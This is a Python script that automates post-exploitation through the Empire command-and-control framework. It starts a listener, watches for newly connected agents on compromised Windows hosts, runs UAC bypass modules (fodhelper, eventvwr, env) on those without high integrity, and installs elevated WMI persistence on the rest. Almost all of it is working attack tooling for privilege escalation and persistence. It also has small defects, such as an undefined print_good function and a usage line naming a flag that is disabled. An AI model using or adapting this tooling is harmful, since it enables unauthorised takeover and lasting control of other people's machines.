# /usr/bin/env python3
# -*- coding: utf-8 -*-  
# usage : python auto_recon.py -u username -p password --url http://url:port -lip ip -lp

import empireapi
import requests
import argparse
import signal
import sys
import re
import threading
#from termcolor import colored
from argparse import RawTextHelpFormatter
from time import sleep
from requests import ConnectionError
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

__version__ = '0.0.1'

def pwn_the_target(agent_name):
    print(agent_name)
    print(agents[agent_name]['username'])
    if not agents[agent_name]['high_integrity']:
            if '10' in agents[agent_name]['os']:
                print("Detected this agent is windows10 system，use two bypassuac!!!!!!!!!")
                empireapi.bypassuac_env(token,agent_name)
                sleep(20)
                empireapi.bypassuac_fodhelper(token,agent_name)
                return 
            empireapi.bypassuac_eventvwr(token,agent_name,empireapi.listener)
            print("Bypassuac is started ! It will have a new High_integrity !\n")
    else:
        print("{} is a HighIntegrity Agent . Now Start Test Persistence Function".format(agent_name))
        if agents[agent_name]['username'] != "WORKGROUP\SYSTEM":
            print("{} is not System, persisting......".format(agent_name))
            empireapi.persistence_elevated_wmi(token, agent_name , empireapi.listener)
        else:
            print("{} have been Persisted".format(agent_name))


if __name__ == '__main__':
    args = argparse.ArgumentParser( description = '''Automatic privilege maintenance''', formatter_class = RawTextHelpFormatter)
    
    args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username (default: empireadmin)')
    args.add_argument('-p', '--password', type=str, default='Password123', help='Empire password (default: Password123)')
    args.add_argument('-lip', '--listener-ip', type=str, help='IP for the http1 listener (Empire should auto detect the IP, if not use this flag)')
    args.add_argument('-lp', '--listener-port', type=int, default=8443, metavar='PORT', help='Port to start the http1 listener on (default: 8443)')
    args.add_argument('-t', '--threads', type=int, default=20, help='Specifies the number of threads for modules to use (default: 20)')
    args.add_argument('--no-mimikatz', action='store_true', help='Do not use Mimikatz during lateral movement (default: False)')
    #args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL (default: https://127.0.0.1:1337)')
    args.add_argument('--debug', action='store_true', help='Enable debug output')
    
    args = args.parse_args()
    
    headers = {'Content-Type': 'application/json'}
    token = {'token': None}
    
    tried_domain_privesc = False
    
    lock = threading.Lock()
    
    module_threads = args.threads
    debug = args.debug
    
    agents = {}
    
    persisted_host = []
    
    agent_threads = {}
    recon_threads = {}
    privesc_threads = {}
    spread_threads = {}
    
    priority_targets = []    # List of boxes with admin sessions
    domain_controllers = []
    domain_admins = []
    spread_usernames = []    # List of accounts we already used to laterally spread
    psinject_usernames = []  # List of accounts we psinjected into
    spawned_usernames = []   # List of accounts we spawned agents with
    
    token['token'] = empireapi.login(args.username, args.password)
    
    print(token['token'])
    
    if not empireapi.get_listener_by_name(token):
        listener_opts = {'CertPath': 'data/', 'Name': empireapi.listener , 'Port': args.listener_port}
        if args.listener_ip:
            listener_opts['Host'] = args.listener_ip

        empireapi.start_listener(listener_opts)
        print('done')
        
    while True:
        for agent in empireapi.get_agents(token)['agents']:
            agent_name = agent['name']
            if agent_name not in agents.keys() and empireapi.agent_finished_initializing(agent):       #判断是否有新agent上线
                print_good(colored('New Agent'.format(agent['name']), 'yellow') + ' => Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['name'],
                                                                                                                                                       agent['external_ip'],
                                                                                                                                                       agent['hostname'],
                                                                                                                                                       agent['username'],
                                                                                                                                                       agent['high_integrity']))

                agents[agent_name] = {'id': agent['ID'],
                                  'ip': agent['external_ip'],
                                  'hostname': agent['hostname'],
                                  'username': agent['username'],
                                  'high_integrity': agent['high_integrity'],
                                  'os': agent['os_details']}
                agent_threads[agent_name] = empireapi.KThread(target=pwn_the_target, args=(agent_name,))
                agent_threads[agent_name].start()
        sleep(5)
    sys.exit(0)

